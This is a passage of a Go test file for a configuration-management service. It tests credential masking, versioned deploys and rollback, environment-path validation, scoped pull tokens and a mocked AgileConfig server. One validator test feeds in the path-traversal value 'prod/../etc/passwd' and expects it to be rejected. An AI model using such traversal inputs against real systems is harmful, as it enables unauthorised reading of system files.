package configs

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/custos-machina/backend/internal/modules/projects"
	cryptopkg "github.com/custos-machina/backend/internal/pkg/crypto"
	"github.com/glebarez/sqlite"
	"gopkg.in/yaml.v3"
	"gorm.io/gorm"
)

type fakeExec struct {
	written   map[uint]map[string]string // serverID -> path -> content
	commands  []string
	events    []string
	failWrite bool
}

func newFakeExec() *fakeExec { return &fakeExec{written: map[uint]map[string]string{}} }

func (f *fakeExec) SftpWrite(serverID uint, name string, content []byte) error {
	if f.failWrite {
		return errors.New("sftp down")
	}
	if f.written[serverID] == nil {
		f.written[serverID] = map[string]string{}
	}
	f.written[serverID][name] = string(content)
	return nil
}

func (f *fakeExec) RunCommandOn(_ context.Context, _ uint, cmd, _ string, _ time.Duration) (string, error) {
	f.commands = append(f.commands, cmd)
	return "", nil
}

func (f *fakeExec) RecordEvent(_ context.Context, _ uint, typ, msg string) {
	f.events = append(f.events, typ+": "+msg)
}

// fakeProj 槽位数联动校验的 projects.Reader 假实现（仅 ViewByID 有值）。
type fakeProj struct {
	slots int
}

func (f *fakeProj) ViewByID(_ context.Context, id uint) (*projects.View, error) {
	if f.slots == 0 && id == 0 {
		return nil, projects.ErrViewNotFound
	}
	return &projects.View{ID: id, Name: "demo", TestSlotCount: f.slots}, nil
}
func (f *fakeProj) ViewByRepoPath(context.Context, string) (*projects.View, error) {
	return nil, projects.ErrViewNotFound
}
func (f *fakeProj) EncryptedCIToken(context.Context, string) string { return "" }

func testSvc(t *testing.T) (*Service, *gorm.DB, *fakeExec) {
	t.Helper()
	db, err := gorm.Open(sqlite.Open(":memory:"), &gorm.Config{})
	if err != nil {
		t.Fatal(err)
	}
	sqlDB, _ := db.DB()
	sqlDB.SetMaxOpenConns(1)
	if err := db.AutoMigrate(&File{}, &Version{}); err != nil {
		t.Fatal(err)
	}
	exec := newFakeExec()
	return NewService(db, exec, nil, &fakeProj{slots: 3}), db, exec
}

// 字段级脱敏（2026-11-09 用户定档）：仅凭据类键（token/secret/pwd/password）
// 打码，其余字段明文；分隔符保留（env 的 = 不被改写）。
func TestMaskSensitive(t *testing.T) {
	in := `# 注释保留
server:
  host: db.prod.internal
  password: s3cret-token
  secret: another-one
PORT=8080
DB_PWD=topsecret
API_KEY=abcd1234
"auth_token": "json-style"
block: |
  multi
  lines
struct_key: {nested}
plain line
---`
	out := MaskSensitive(in)
	for _, keep := range []string{
		"password: ***", "secret: ***", "DB_PWD=***", `"auth_token": "***"`,
		// 非凭据键保留明文
		"host: db.prod.internal", "PORT=8080", "API_KEY=abcd1234",
		// 结构行与 block 指示不被打码
		"block: |", "struct_key: {nested}",
		"# 注释保留", "plain line", "---",
	} {
		if !strings.Contains(out, keep) {
			t.Errorf("输出应含 %q:\n%s", keep, out)
		}
	}
	if strings.Contains(out, "s3cret") || strings.Contains(out, "another-one") || strings.Contains(out, "topsecret") {
		t.Errorf("敏感值泄漏:\n%s", out)
	}
	if strings.Contains(out, "abcd1234") && strings.Contains(out, "***") && strings.Contains(out, "API_KEY=***") {
		t.Error("非凭据键不应被打码")
	}
	// 无敏感键的文件幂等（原样返回）
	if got := MaskSensitive("a: 1\nb=2\n"); got != "a: 1\nb=2\n" {
		t.Errorf("无敏感键应原样返回: %q", got)
	}
	if !hasSensitiveFields("k: 1\npassword: x\n") || hasSensitiveFields("k: 1\n") {
		t.Error("hasSensitiveFields 判定异常")
	}
}

func TestLifecycleAndVersions(t *testing.T) {
	svc, _, exec := testSvc(t)
	ctx := context.Background()
	f, err := svc.Create(ctx, SaveFileInput{
		Name: "app 配置", ServerID: 1, Path: "/etc/app/config.yaml", Format: FormatYAML,
		Content: "k: v1\n", ApplyAction: ApplyNone,
	}, "op-a")
	if err != nil {
		t.Fatal(err)
	}
	// 编辑 v2
	if err := svc.SaveContent(ctx, f.ID, "k: v2\n", "op-b"); err != nil {
		t.Fatal(err)
	}
	vs, _ := svc.ListVersions(ctx, f.ID)
	if len(vs) != 2 {
		t.Fatalf("应有 2 个版本, got %d", len(vs))
	}
	// 下发（v2 内容落盘 + deploy 快照）
	if err := svc.Deploy(ctx, f.ID, "op-b"); err != nil {
		t.Fatal(err)
	}
	if got := exec.written[1]["/etc/app/config.yaml"]; got != "k: v2\n" {
		t.Errorf("落盘内容不符: %q", got)
	}
	// 回滚到 v1
	if err := svc.Rollback(ctx, f.ID, vs[1].ID, "op-a"); err != nil {
		t.Fatal(err)
	}
	content, _, err := svc.GetContent(ctx, f.ID, false, "x")
	if err != nil || content != "k: v1\n" {
		t.Fatalf("回滚后内容应为 v1: %q %v", content, err)
	}
	// 审计事件：config_deploy 至少一条
	found := false
	for _, e := range exec.events {
		if strings.Contains(e, "config_deploy") {
			found = true
		}
	}
	if !found {
		t.Error("下发应落审计事件")
	}
	// 版本链：edit/deploy/rollback
	vs2, _ := svc.ListVersions(ctx, f.ID)
	if len(vs2) != 4 { // edit v1, edit v2, deploy, rollback
		t.Errorf("版本链数量不符: %d", len(vs2))
	}
}

func TestSensitiveMaskAndReveal(t *testing.T) {
	svc, db, exec := testSvc(t)
	ctx := context.Background()
	// 敏感键自动识别（不再有文件级开关）：password 打码、普通键明文
	f, err := svc.Create(ctx, SaveFileInput{
		Name: "env", ServerID: 1, Path: "/etc/app/.env", Format: FormatEnv,
		Content: "DB_PWD=topsecret\nDB_HOST=127.0.0.1\n", ApplyAction: ApplyNone,
	}, "op")
	if err != nil {
		t.Fatal(err)
	}
	masked, _, _ := svc.GetContent(ctx, f.ID, false, "x")
	if !strings.Contains(masked, "DB_PWD=***") || !strings.Contains(masked, "DB_HOST=127.0.0.1") {
		t.Errorf("默认仅敏感字段脱敏: %q", masked)
	}
	if strings.Contains(masked, "topsecret") {
		t.Errorf("敏感值泄漏: %q", masked)
	}
	if len(exec.events) != 0 {
		t.Error("未 reveal 不应落审计")
	}
	clear, _, _ := svc.GetContent(ctx, f.ID, true, "op-x")
	if clear != "DB_PWD=topsecret\nDB_HOST=127.0.0.1\n" {
		t.Errorf("reveal 应返回明文: %q", clear)
	}
	if len(exec.events) != 1 || !strings.Contains(exec.events[0], "op-x") {
		t.Errorf("reveal 应落审计: %v", exec.events)
	}
	// 环境分流判定：槽位文件免权限、prod/裸文件需权限
	if ok, _ := svc.IsTestFile(ctx, f.ID); ok {
		t.Error("裸文件（无层级）按正式环境最严处理")
	}
	if err := db.Exec(`CREATE TABLE project_env_targets (id INTEGER PRIMARY KEY, project_id INTEGER, env_type TEXT, server_id INTEGER)`).Error; err != nil {
		t.Fatal(err)
	}
	db.Exec(`INSERT INTO project_env_targets (project_id, env_type, server_id) VALUES (1, 'test', 1)`)
	f2, err := svc.Create(ctx, SaveFileInput{
		Name: "slot", ServerID: 1, Path: "/etc/app/dev.yaml", Format: FormatYAML,
		ProjectID: 1, RelPath: "dev1/app.yaml", Content: "k: v\n", ApplyAction: ApplyNone,
	}, "op")
	if err != nil {
		t.Fatal(err)
	}
	if ok, _ := svc.IsTestFile(ctx, f2.ID); !ok {
		t.Error("dev1 首段应判定为测试族")
	}
	// 无敏感键的文件 reveal 不落审计（无密可泄）
	f3, _ := svc.Create(ctx, SaveFileInput{
		Name: "plain", ServerID: 1, Path: "/etc/app/plain.yaml", Format: FormatYAML,
		Content: "k: v\n", ApplyAction: ApplyNone,
	}, "op")
	before := len(exec.events)
	_, _, _ = svc.GetContent(ctx, f3.ID, true, "op-y")
	if len(exec.events) != before {
		t.Error("无敏感键 reveal 不应落审计")
	}
}

func TestApplyActions(t *testing.T) {
	svc, _, exec := testSvc(t)
	ctx := context.Background()
	// SIGHUP
	f1, _ := svc.Create(ctx, SaveFileInput{Name: "a", ServerID: 1, Path: "/x/a.conf",
		Format: FormatINI, Content: "k=1\n", ApplyAction: ApplySighup, ApplyTarget: "myapp"}, "op")
	if err := svc.Deploy(ctx, f1.ID, "op"); err != nil {
		t.Fatal(err)
	}
	if len(exec.commands) != 1 || !strings.Contains(exec.commands[0], "pkill -HUP") {
		t.Errorf("应执行 SIGHUP: %v", exec.commands)
	}
	// restart
	f2, _ := svc.Create(ctx, SaveFileInput{Name: "b", ServerID: 1, Path: "/x/b.yaml",
		Format: FormatYAML, Content: "k: 1\n", ApplyAction: ApplyRestart, ApplyTarget: "myapp"}, "op")
	if err := svc.Deploy(ctx, f2.ID, "op"); err != nil {
		t.Fatal(err)
	}
	if len(exec.commands) != 2 || !strings.Contains(exec.commands[1], "docker restart 'myapp'") {
		t.Errorf("应执行 docker restart: %v", exec.commands)
	}
	// 目标缺失校验
	if _, err := svc.Create(ctx, SaveFileInput{Name: "c", ServerID: 1, Path: "/x/c",
		Format: FormatYAML, ApplyAction: ApplySighup}, "op"); err == nil {
		t.Error("SIGHUP 无目标应拒绝")
	}
	if _, err := svc.Create(ctx, SaveFileInput{Name: "d", ServerID: 1, Path: "/x/d",
		Format: FormatYAML, ApplyAction: ApplyHTTP, ApplyTarget: "not-url"}, "op"); err == nil {
		t.Error("非法 refresh URL 应拒绝")
	}
}

func TestDeployFailureKeepsAudit(t *testing.T) {
	svc, _, exec := testSvc(t)
	exec.failWrite = true
	ctx := context.Background()
	f, _ := svc.Create(ctx, SaveFileInput{Name: "e", ServerID: 1, Path: "/x/e",
		Format: FormatYAML, Content: "k: 1\n", ApplyAction: ApplyNone}, "op")
	if err := svc.Deploy(ctx, f.ID, "op"); err == nil {
		t.Fatal("写入失败应报错")
	}
	if len(exec.events) == 0 {
		t.Error("失败也应落审计")
	}
}

// R2 层级路径强语义（2026-11-09 返工）：首段 = prod 或槽位名 dev1..devN
// （联动 TestSlotCount，fakeProj=3）；canary/test 旧枚举拒绝（迁移 0011 已重写存量）。
func TestValidateRelPath(t *testing.T) {
	svc, db, _ := testSvc(t)
	ctx := context.Background()
	if err := db.Exec(`CREATE TABLE project_env_targets (id INTEGER PRIMARY KEY, project_id INTEGER, env_type TEXT, server_id INTEGER)`).Error; err != nil {
		t.Fatal(err)
	}
	if err := db.Exec(`INSERT INTO project_env_targets (project_id, env_type, server_id) VALUES (1, 'prod', 1), (1, 'test', 2)`).Error; err != nil {
		t.Fatal(err)
	}
	// 合法：prod + 槽位首段（3 槽位内）
	for _, p := range []string{"prod/application.yaml", "dev1/app.yaml", "dev3/app.yaml", "dev2/sub/app.env"} {
		if err := svc.validateRelPath(ctx, 1, p); err != nil {
			t.Fatalf("合法路径 %q 被拒: %v", p, err)
		}
	}
	// 空路径（旧形态）放行
	if err := svc.validateRelPath(ctx, 0, ""); err != nil {
		t.Fatalf("空路径应放行: %v", err)
	}
	// 超出槽位数（fakeProj=3）
	for _, p := range []string{"dev4/app.yaml", "dev10/app.yaml"} {
		if err := svc.validateRelPath(ctx, 1, p); err == nil {
			t.Fatalf("超槽位路径 %q 应拒绝", p)
		}
	}
	// 非法槽位形态与旧枚举
	for _, p := range []string{"dev0/app.yaml", "devx/app.yaml", "test/app.yaml", "canary/app.yaml", "staging/app.yaml"} {
		if err := svc.validateRelPath(ctx, 1, p); err == nil {
			t.Fatalf("非法首段 %q 应拒绝", p)
		}
	}
	// 未绑定环境族（项目 2 无 env target）
	if err := svc.validateRelPath(ctx, 2, "dev1/app.yaml"); err == nil {
		t.Fatal("未绑定 test 目标应拒绝")
	}
	// 无项目归属
	if err := svc.validateRelPath(ctx, 0, "prod/app.yaml"); err == nil {
		t.Fatal("无项目归属应拒绝")
	}
	// 路径段非法
	if err := svc.validateRelPath(ctx, 1, "prod/../etc/passwd"); err == nil {
		t.Fatal("非法段应拒绝")
	}
	// 创建链路也校验（Create 走 validateRelPath）
	if _, err := svc.Create(ctx, SaveFileInput{
		Name: "x", ServerID: 1, Path: "/opt/x.yaml", Format: "yaml",
		ApplyAction: "none", ProjectID: 1, RelPath: "prod/x.yaml", Content: "a: 1",
	}, "t"); err != nil {
		t.Fatalf("合法创建被拒: %v", err)
	}
	var f File
	if err := db.First(&f).Error; err != nil {
		t.Fatal(err)
	}
	if f.RelPath != "prod/x.yaml" || f.ProjectID != 1 {
		t.Fatalf("字段未落库: %+v", f)
	}
}

// 环境同步：prod → 槽位建档（目标主机跟随 test 部署目标）+ 覆盖生成新版本。
func TestEnvSync(t *testing.T) {
	svc, db, _ := testSvc(t)
	ctx := context.Background()
	if err := db.Exec(`CREATE TABLE project_env_targets (id INTEGER PRIMARY KEY, project_id INTEGER, env_type TEXT, server_id INTEGER)`).Error; err != nil {
		t.Fatal(err)
	}
	if err := db.Exec(`INSERT INTO project_env_targets (project_id, env_type, server_id) VALUES (1, 'prod', 10), (1, 'test', 20)`).Error; err != nil {
		t.Fatal(err)
	}
	src, err := svc.Create(ctx, SaveFileInput{
		Name: "app", ServerID: 10, Path: "/opt/app/a.yaml", Format: "yaml",
		ApplyAction: "none", ProjectID: 1, RelPath: "prod/app.yaml", Content: "v: 1",
	}, "t")
	if err != nil {
		t.Fatal(err)
	}
	// 同 prod → dev1：新建（主机跟随 test 目标）；源路径不含 {env} 且目标主机
	// 不同（prod=10、test=20）→ 无覆盖警告
	r1, err := svc.EnvSync(ctx, EnvSyncInput{ProjectID: 1, SourceEnv: "prod", TargetEnv: "dev1"}, "t")
	if err != nil || r1.Created != 1 || r1.Updated != 0 {
		t.Fatalf("首次同步: c=%d u=%d err=%v", r1.Created, r1.Updated, err)
	}
	if len(r1.Warnings) != 0 {
		t.Fatalf("主机不同不应有覆盖警告: %v", r1.Warnings)
	}
	var dst File
	if err := db.Where("project_id = 1 AND rel_path = ?", "dev1/app.yaml").First(&dst).Error; err != nil {
		t.Fatal("目标文件未建档", err)
	}
	if dst.ServerID != 20 {
		t.Fatalf("目标主机应跟随 test 部署目标: %d", dst.ServerID)
	}
	if dst.Content != "v: 1" {
		t.Fatalf("内容未同步: %q", dst.Content)
	}
	// 源更新后再同步：覆盖生成新版本
	if err := svc.SaveContent(ctx, src.ID, "v: 2", "t"); err != nil {
		t.Fatal(err)
	}
	r2, err := svc.EnvSync(ctx, EnvSyncInput{ProjectID: 1, SourceEnv: "prod", TargetEnv: "dev1"}, "t")
	if err != nil || r2.Created != 0 || r2.Updated != 1 {
		t.Fatalf("二次同步: c=%d u=%d err=%v", r2.Created, r2.Updated, err)
	}
	if err := db.First(&dst, dst.ID).Error; err != nil {
		t.Fatal(err)
	}
	if dst.Content != "v: 2" {
		t.Fatalf("覆盖未生效: %q", dst.Content)
	}
	var n int64
	if err := db.Model(&Version{}).Where("file_id = ? AND source = ?", dst.ID, SourceEnvSync).Count(&n).Error; err != nil {
		t.Fatal(err)
	}
	if n != 2 {
		t.Fatalf("env_sync 版本数不符: %d", n)
	}
	// 同环境拒绝 / canary 拒绝（引用 prod 无独立目录）/ 未绑定环境族拒绝
	if _, err := svc.EnvSync(ctx, EnvSyncInput{ProjectID: 1, SourceEnv: "prod", TargetEnv: "prod"}, "t"); err == nil {
		t.Fatal("同环境应拒绝")
	}
	if _, err := svc.EnvSync(ctx, EnvSyncInput{ProjectID: 1, SourceEnv: "prod", TargetEnv: "canary"}, "t"); err == nil {
		t.Fatal("canary 应拒绝（引用 prod）")
	}
	if _, err := svc.EnvSync(ctx, EnvSyncInput{ProjectID: 1, SourceEnv: "prod", TargetEnv: "dev9"}, "t"); err == nil {
		t.Fatal("未绑定环境族应拒绝")
	}
}

// ---- P6-M5 拉取 API（方案 B）----

func pullTestDB(t *testing.T) *gorm.DB {
	t.Helper()
	db, err := gorm.Open(sqlite.Open(":memory:"), &gorm.Config{})
	if err != nil {
		t.Fatalf("打开内存库失败: %v", err)
	}
	if err := db.AutoMigrate(&File{}, &PullToken{}); err != nil {
		t.Fatalf("迁移失败: %v", err)
	}
	if err := db.Exec(`CREATE TABLE projects (id INTEGER PRIMARY KEY, name TEXT, registry_id INTEGER, deleted_at DATETIME)`).Error; err != nil {
		t.Fatalf("建 projects 表失败: %v", err)
	}
	if err := db.Exec(`CREATE TABLE registries (id INTEGER PRIMARY KEY, name TEXT, type TEXT, address TEXT)`).Error; err != nil {
		t.Fatalf("建 registries 表失败: %v", err)
	}
	return db
}

func pullSeed(t *testing.T, db *gorm.DB, files ...File) {
	t.Helper()
	db.Exec(`INSERT INTO projects (id, name) VALUES (1, 'demo')`)
	for i := range files {
		f := files[i]
		f.ProjectID = 1
		if err := db.Create(&f).Error; err != nil {
			t.Fatalf("seed file 失败: %v", err)
		}
	}
}

// ---- {env} 占位符（远端路径环境路由） ----

func TestRenderPath(t *testing.T) {
	cases := []struct{ path, relPath, want string }{
		{"/opt/x/config/{env}/app.yaml", "prod/app.yaml", "/opt/x/config/prod/app.yaml"},
		{"/opt/x/config/{env}/app.yaml", "dev2/app.yaml", "/opt/x/config/dev2/app.yaml"},
		{"/opt/x/config/{env}/app.yaml", "canary/app.yaml", "/opt/x/config/prod/app.yaml"}, // canary 引用 prod
		{"/opt/x/config/{env}/app.yaml", "", "/opt/x/config/prod/app.yaml"},                // 无层级旧形态按 prod
		{"/opt/x/config/app.yaml", "dev2/app.yaml", "/opt/x/config/app.yaml"},              // 无占位符原样
		{"/opt/{env}/{env}/a.yaml", "dev1/a.yaml", "/opt/dev1/dev1/a.yaml"},                // 多处全替换
	}
	for _, c := range cases {
		if got := renderPath(c.path, c.relPath); got != c.want {
			t.Fatalf("renderPath(%q, %q) = %q, want %q", c.path, c.relPath, got, c.want)
		}
	}
	if err := validateEnvPlaceholder("/opt/x/{env}/a.yaml", ""); err == nil {
		t.Fatal("无层级路径含 {env} 应拒绝")
	}
	if err := validateEnvPlaceholder("/opt/x/{env}/a.yaml", "prod/a.yaml"); err != nil {
		t.Fatalf("有层级不应拒绝: %v", err)
	}
}

func TestDeployRendersEnvPlaceholder(t *testing.T) {
	svc, db, exec := testSvc(t)
	if err := db.Exec(`CREATE TABLE project_env_targets (id INTEGER PRIMARY KEY, project_id INTEGER, env_type TEXT, server_id INTEGER)`).Error; err != nil {
		t.Fatal(err)
	}
	if err := db.Exec(`INSERT INTO project_env_targets (project_id, env_type, server_id) VALUES (1, 'test', 20)`).Error; err != nil {
		t.Fatal(err)
	}
	f, err := svc.Create(t.Context(), SaveFileInput{
		Name: "app", ServerID: 20, Path: "/opt/app/{env}/app.yaml", Format: "yaml",
		ApplyAction: "none", ProjectID: 1, RelPath: "dev2/app.yaml", Content: "v: 1",
	}, "t")
	if err != nil {
		t.Fatal(err)
	}
	if err := svc.Deploy(t.Context(), f.ID, "t"); err != nil {
		t.Fatalf("下发失败: %v", err)
	}
	if got, ok := exec.written[20]["/opt/app/dev2/app.yaml"]; !ok || got != "v: 1" {
		t.Fatalf("落盘路径应渲染 {env}: %+v", exec.written[20])
	}
	// FileOut 预览路径
	list, _ := svc.List(t.Context())
	if len(list) != 1 || list[0].RenderedPath != "/opt/app/dev2/app.yaml" {
		t.Fatalf("renderedPath 异常: %+v", list)
	}
}

func TestEnvSyncSameServerWarns(t *testing.T) {
	svc, db, _ := testSvc(t)
	if err := db.Exec(`CREATE TABLE project_env_targets (id INTEGER PRIMARY KEY, project_id INTEGER, env_type TEXT, server_id INTEGER)`).Error; err != nil {
		t.Fatal(err)
	}
	// prod 与 test 同主机：路径无 {env} 的源同步后落盘同路径 → 应出警告
	if err := db.Exec(`INSERT INTO project_env_targets (project_id, env_type, server_id) VALUES (1, 'prod', 10), (1, 'test', 10)`).Error; err != nil {
		t.Fatal(err)
	}
	if _, err := svc.Create(t.Context(), SaveFileInput{
		Name: "app", ServerID: 10, Path: "/opt/app/app.yaml", Format: "yaml",
		ApplyAction: "none", ProjectID: 1, RelPath: "prod/app.yaml", Content: "v: 1",
	}, "t"); err != nil {
		t.Fatal(err)
	}
	r, err := svc.EnvSync(t.Context(), EnvSyncInput{ProjectID: 1, SourceEnv: "prod", TargetEnv: "dev1"}, "t")
	if err != nil {
		t.Fatal(err)
	}
	if len(r.Warnings) != 1 {
		t.Fatalf("同主机无占位符应有 1 条覆盖警告: %+v", r.Warnings)
	}
	// 源路径含 {env}：占位符按各自环境渲染，无警告
	db.Model(&File{}).Where("rel_path = ?", "prod/app.yaml").Update("path", "/opt/app/{env}/app.yaml")
	r2, err := svc.EnvSync(t.Context(), EnvSyncInput{ProjectID: 1, SourceEnv: "prod", TargetEnv: "dev2"}, "t")
	if err != nil {
		t.Fatal(err)
	}
	if len(r2.Warnings) != 0 {
		t.Fatalf("占位符路径不应警告: %+v", r2.Warnings)
	}
}

// ---- 保留端点 /api/config/{app}/registry ----

func TestPullRegistry(t *testing.T) {
	db := pullTestDB(t)
	db.Exec(`INSERT INTO projects (id, name, registry_id) VALUES (1, 'demo', 5)`)
	db.Exec(`INSERT INTO registries (id, name, type, address) VALUES (5, 'tcr', 'tencent', 'ccr.ccs.tencentyun.com/starveil')`)
	svc := &Service{db: db}
	out, err := svc.PullRegistry(t.Context(), "demo")
	if err != nil || !out.Bound || out.Address != "ccr.ccs.tencentyun.com/starveil" || out.Type != "tencent" {
		t.Fatalf("绑定场景异常: %+v err=%v", out, err)
	}
	// 解绑 / 未绑定：bound=false 而非报错
	db.Exec(`UPDATE projects SET registry_id = NULL WHERE id = 1`)
	out, err = svc.PullRegistry(t.Context(), "demo")
	if err != nil || out.Bound || out.Address != "" {
		t.Fatalf("未绑定应 bound=false: %+v err=%v", out, err)
	}
	// 项目不存在：同样 bound=false（不泄露项目存在性，公开端点）
	out, err = svc.PullRegistry(t.Context(), "ghost")
	if err != nil || out.Bound {
		t.Fatalf("项目不存在应 bound=false: %+v err=%v", out, err)
	}
}

func TestPullMergeYAML(t *testing.T) {
	db := pullTestDB(t)
	pullSeed(t, db,
		File{Name: "基础", RelPath: "prod/app.yaml", Path: "/x/a.yaml", Format: FormatYAML, Content: "server:\n  port: 8080\nlog_level: info\n"},
		File{Name: "扩展", RelPath: "prod/extra.yaml", Path: "/x/b.yaml", Format: FormatYAML, Content: "server:\n  host: 0.0.0.0\nfeature_x: true\n"},
	)
	svc := &Service{db: db}
	out, err := svc.PullConfig(t.Context(), "demo", "prod")
	if err != nil {
		t.Fatalf("拉取失败: %v", err)
	}
	if out.Files != 2 || out.Version == "" {
		t.Fatalf("聚合异常: %+v", out)
	}
	var m map[string]any
	if err := yaml.Unmarshal(out.Body, &m); err != nil {
		t.Fatalf("合并结果非合法 yaml: %v\n%s", err, out.Body)
	}
	srv := m["server"].(map[string]any)
	if srv["port"] != 8080 || srv["host"] != "0.0.0.0" || m["feature_x"] != true {
		t.Fatalf("深合并结果异常: %s", out.Body)
	}
}

func TestPullConflictKey(t *testing.T) {
	db := pullTestDB(t)
	pullSeed(t, db,
		File{Name: "a", RelPath: "prod/a.yaml", Path: "/x/a.yaml", Format: FormatYAML, Content: "port: 1\n"},
		File{Name: "b", RelPath: "prod/b.yaml", Path: "/x/b.yaml", Format: FormatYAML, Content: "port: 2\n"},
	)
	svc := &Service{db: db}
	_, err := svc.PullConfig(t.Context(), "demo", "prod")
	if err == nil || !strings.Contains(err.Error(), "冲突") {
		t.Fatalf("同 key 冲突应报错, got %v", err)
	}
}

func TestPullFlatENV(t *testing.T) {
	db := pullTestDB(t)
	pullSeed(t, db,
		File{Name: "a", RelPath: "dev1/a.env", Path: "/x/a.env", Format: "env", Content: "DB_HOST=localhost\n# 注释\nDB_PORT=5432\n"},
		File{Name: "b", RelPath: "dev1/b.env", Path: "/x/b.env", Format: "env", Content: "CACHE=redis\n"},
	)
	svc := &Service{db: db}
	out, err := svc.PullConfig(t.Context(), "demo", "dev1")
	if err != nil {
		t.Fatalf("拉取失败: %v", err)
	}
	body := string(out.Body)
	for _, kv := range []string{"DB_HOST=localhost", "DB_PORT=5432", "CACHE=redis"} {
		if !strings.Contains(body, kv) {
			t.Fatalf("平铺合并缺 %s: %s", body, kv)
		}
	}
}

// canary 全面引用 prod（2026-11-09）：拉取/合并视图选 canary 返回 prod 内容。
func TestPullCanaryReferencesProd(t *testing.T) {
	db := pullTestDB(t)
	pullSeed(t, db,
		File{Name: "a", RelPath: "prod/a.yaml", Path: "/x/a.yaml", Format: FormatYAML, Content: "port: 1\n"},
		File{Name: "legacy", RelPath: "canary/a.yaml", Path: "/x/c.yaml", Format: FormatYAML, Content: "port: 9\n"},
	)
	svc := &Service{db: db}
	out, err := svc.PullConfig(t.Context(), "demo", "canary")
	if err != nil {
		t.Fatalf("canary 拉取失败: %v", err)
	}
	// 只聚合 prod 首段（残留 canary 目录数据不参与——迁移 0011 会清理）
	if out.Files != 1 || !strings.Contains(string(out.Body), "port: 1") {
		t.Fatalf("canary 应引用 prod: files=%d body=%s", out.Files, out.Body)
	}
	if strings.Contains(string(out.Body), "port: 9") {
		t.Fatal("canary 残留目录不应参与聚合")
	}
	merged, err := svc.MergedPreview(t.Context(), 1, "canary", "yaml", false, "t")
	if err != nil || !strings.Contains(merged.Body, "port: 1") {
		t.Fatalf("合并视图 canary 应引用 prod: %v %s", err, merged.Body)
	}
}

func TestPullMixedFormatFamily(t *testing.T) {
	db := pullTestDB(t)
	pullSeed(t, db,
		File{Name: "a", RelPath: "prod/a.yaml", Path: "/x/a.yaml", Format: FormatYAML, Content: "a: 1\n"},
		File{Name: "b", RelPath: "prod/b.env", Path: "/x/b.env", Format: "env", Content: "A=1\n"},
	)
	svc := &Service{db: db}
	if _, err := svc.PullConfig(t.Context(), "demo", "prod"); err == nil || !strings.Contains(err.Error(), "不可合并") {
		t.Fatalf("跨格式族应报错, got %v", err)
	}
}

func TestPullTokenScope(t *testing.T) {
	db := pullTestDB(t)
	pullSeed(t, db, File{Name: "a", RelPath: "prod/a.yaml", Path: "/x/a.yaml", Format: FormatYAML, Content: "a: 1\n"})
	svc := &Service{db: db}
	out, err := svc.IssuePullToken(t.Context(), "demo 拉取", "demo", "prod,test")
	if err != nil {
		t.Fatalf("签发失败: %v", err)
	}
	if !strings.HasPrefix(out.Plaintext, "pull_") {
		t.Fatalf("明文形态异常: %s", out.Plaintext)
	}
	// 合法范围
	if _, err := svc.VerifyPullToken(t.Context(), out.Plaintext, "demo", "test"); err != nil {
		t.Fatalf("范围内应放行: %v", err)
	}
	// 跨应用
	if _, err := svc.VerifyPullToken(t.Context(), out.Plaintext, "other", "prod"); err == nil || !strings.Contains(err.Error(), "不适用于应用") {
		t.Fatalf("跨应用应拒: %v", err)
	}
	// 跨环境
	if _, err := svc.VerifyPullToken(t.Context(), out.Plaintext, "demo", "canary"); err == nil || !strings.Contains(err.Error(), "不适用于环境") {
		t.Fatalf("跨环境应拒: %v", err)
	}
	// 吊销即失效
	if err := svc.SetPullTokenEnabled(t.Context(), out.ID, false); err != nil {
		t.Fatalf("吊销失败: %v", err)
	}
	if _, err := svc.VerifyPullToken(t.Context(), out.Plaintext, "demo", "prod"); err == nil {
		t.Fatal("吊销后应拒")
	}
	// 幻觉应用名
	if _, err := svc.IssuePullToken(t.Context(), "x", "不存在应用", "*"); err == nil {
		t.Fatal("幻觉应用名应拒")
	}
}

// ---- P6-M7 配置中心（AgileConfig 纯后端通道，文件派生键值）----

// fakeAgile 按官方 REST 文档模拟 AgileConfig（足够覆盖同步/对账链路）。
type fakeAgile struct {
	mu     sync.Mutex
	apps   []map[string]any
	config []map[string]any
	seq    int
}

func fakeAgileSSE(t *testing.T) (*fakeAgile, *httptest.Server) {
	t.Helper()
	fa := &fakeAgile{}
	mux := http.NewServeMux()
	basic := func(r *http.Request) (string, string) {
		raw := strings.TrimPrefix(r.Header.Get("Authorization"), "Basic ")
		b, _ := base64.StdEncoding.DecodeString(raw)
		parts := strings.SplitN(string(b), ":", 2)
		if len(parts) != 2 {
			return "", ""
		}
		return parts[0], parts[1]
	}
	ok := func(w http.ResponseWriter) { w.WriteHeader(200) }
	mux.HandleFunc("/api/app", func(w http.ResponseWriter, r *http.Request) {
		u, p := basic(r)
		if u != "admin" || p != "agile-pass" {
			w.WriteHeader(401)
			return
		}
		fa.mu.Lock()
		defer fa.mu.Unlock()
		switch r.Method {
		case http.MethodGet:
			_ = json.NewEncoder(w).Encode(fa.apps)
		case http.MethodPost:
			var m map[string]any
			_ = json.NewDecoder(r.Body).Decode(&m)
			fa.seq++
			m["id"] = fmt.Sprintf("app-%d", fa.seq)
			m["secret"] = fmt.Sprintf("sec-%d", fa.seq)
			fa.apps = append(fa.apps, m)
			w.WriteHeader(201)
		}
	})
	mux.HandleFunc("/api/config", func(w http.ResponseWriter, r *http.Request) {
		u, p := basic(r) // appId / secret
		fa.mu.Lock()
		defer fa.mu.Unlock()
		valid := false
		for _, a := range fa.apps {
			if a["id"] == u && a["secret"] == p {
				valid = true
			}
		}
		if !valid {
			w.WriteHeader(401)
			return
		}
		switch r.Method {
		case http.MethodGet:
			_ = json.NewEncoder(w).Encode(fa.config)
		case http.MethodPost:
			var m map[string]any
			_ = json.NewDecoder(r.Body).Decode(&m)
			fa.seq++
			m["id"] = fmt.Sprintf("cfg-%d", fa.seq)
			m["onlineStatus"] = float64(0)
			m["status"] = float64(1)
			fa.config = append(fa.config, m)
			w.WriteHeader(201)
		case http.MethodPut:
			var m map[string]any
			_ = json.NewDecoder(r.Body).Decode(&m)
			for i, c := range fa.config {
				if c["id"] == m["id"] {
					m["onlineStatus"] = float64(0)
					m["status"] = float64(1)
					fa.config[i] = m
				}
			}
			ok(w)
		}
	})
	mux.HandleFunc("/api/config/publish/", func(w http.ResponseWriter, r *http.Request) {
		id := strings.TrimPrefix(r.URL.Path, "/api/config/publish/")
		fa.mu.Lock()
		defer fa.mu.Unlock()
		for _, c := range fa.config {
			if c["id"] == id {
				c["onlineStatus"] = float64(1)
			}
		}
		ok(w)
	})
	srv := httptest.NewServer(mux)
	t.Cleanup(srv.Close)
	return fa, srv
}

func kvTestService(t *testing.T, agileURL string) *Service {
	t.Helper()
